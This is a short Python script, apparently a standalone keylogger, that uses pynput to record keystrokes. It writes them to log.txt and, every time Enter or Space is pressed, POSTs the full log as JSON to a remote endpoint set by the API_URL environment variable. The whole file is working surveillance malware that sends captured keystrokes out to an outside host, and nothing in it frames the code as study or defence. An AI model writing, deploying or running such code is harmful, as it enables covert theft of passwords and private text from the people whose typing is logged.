import json
import os
from typing import List
from urllib import request

from pynput.keyboard import Key, Listener

LOG_FILE = "log.txt"
API_URL = os.getenv("API_URL", "")
TIMEOUT_SECONDS = int(os.getenv("TIMEOUT_SECONDS", "10"))

char_count = 0
saved_keys: List[str] = []


def on_key_press(key: str) -> None:
    try:
        print("Key Pressed:", key)
    except Exception as ex:
        print("There was an error:", ex)


def on_key_release(key) -> bool | None:
    global saved_keys, char_count

    if key == Key.esc:
        return False

    if key == Key.enter:
        write_to_file(saved_keys)
        send_log_file()
        saved_keys = []
        char_count = 0
        return None

    if key == Key.space:
        saved_keys.append(" ")
        write_to_file(saved_keys)
        send_log_file()
        saved_keys = []
        char_count = 0
        return None

    saved_keys.append(key)
    char_count += 1
    return None


def write_to_file(keys: List[str]) -> None:
    with open(LOG_FILE, "a", encoding="utf-8") as file:
        for key in keys:
            key = str(key).replace("'", "")
            if "key" not in key.lower():
                file.write(key)
        file.write("\n")


def send_log_file() -> None:
    if not API_URL:
        return

    try:
        with open(LOG_FILE, "r", encoding="utf-8") as file:
            content = file.read().strip()
        if not content:
            return

        payload = json.dumps({"log": content}).encode("utf-8")
        req = request.Request(
            API_URL,
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with request.urlopen(req, timeout=5) as response:
            response.read()
    except Exception as ex:
        print("Send failed:", ex)


if __name__ == "__main__":
    print("Start key logging...")
    with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join(timeout=TIMEOUT_SECONDS)
    print("End key logging...")
